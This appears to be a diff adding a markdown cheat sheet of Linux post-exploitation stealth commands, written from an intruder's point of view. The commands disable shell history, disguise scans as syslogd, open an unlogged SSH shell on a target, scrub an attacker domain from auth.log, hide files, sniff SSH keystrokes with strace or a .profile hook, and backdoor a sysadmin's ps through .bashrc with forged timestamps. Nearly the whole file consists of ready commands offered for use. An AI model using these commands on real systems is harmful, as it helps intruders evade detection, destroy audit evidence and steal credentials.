@@ -1,0 +1,44 @@
+- Disable BASH history (do first in every shell)
+	- `export HISTFILE=/dev/null` OR `unset HISTFILE` OR `export HISTSIZE=0`
+- Force-terminate a shell upon exiting it to ensure there are no dangling processes
+	- `alias exit='kill -9 $$'`
+	- Note that history is only written to the disk on clean termination of the shell, so this bypasses that by simply killing it.
+- Execute a command without logging to history (lead with a space)
+	- `$  id`
+- Hide a command by masking it as syslogd (note the parentheses)
+	- `(exec -a syslogd nmap -T0 10.0.0.1/24)`
+- Start a background hidden process masked as syslogd
+	- `exec -a syslogd nmap -T0 10.0.2.1/24 &>nmap.log &`
+	- If there is no BASH:
+		- `cp which nmap syslogd
+		- `PATH=.:$PATH syslogd -T0 10.0.2.1/24`
+- Execute a process as syslogd and hide arguments (must download zap-args.c)
+	- `gcc -Wall -O2 -fpic -shared -o zap-args.so zap-args.c -ldl`
+	- `LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24`
+- Hiding an SSH connection
+	- `ssh -o UserKnownHostsFile=/dev/null -T user@target.com 'bash -i'`
+	- Your user:
+		- Is not added to /var/log/utmp
+		- Won't appear in w or who commands
+		- Has no .profile or .bash_profile
+- Modifying log files to remove evidence of us authenticating
+	- Grep out source domain/IPs and overwrite the files
+		- `cd /dev/shm; grep -v 'atkr\.com' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log`
+	- "Touch" files back to their last modified time for best results
+- Hide a file from ls command:
+	- `alias ls='ls -I malicious'`
+- Weird directory usage:
+	- `"mkdir '...'; cd '...'"`
+- Annoying tabs in directory names:
+	- `mkdir $'\t'; cd $'\t'`
+- Sniff SSH session being made from a box you control
+	- `strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done`
+	- The above will fail if `/proc/sys/kernel/yama/ptrace_scope = 1`
+		- Alternative: `echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile`
+
+- Override PS in sysadmin's bashrc to grep out evil procs
+	- `echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap -e GREP; }' >>~/.bashrc && touch -r /etc/passwd ~/.bashrc`
+
+- Monitor connections to determine when a user has logged in with SSH (will beep when one is detected)
+	- `tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -e '\a'; done`
+		- When SSH'd in, you'll need to change the last portion to redirect the beep to your TTY: `echo -e '\a' > /dev/tty5`
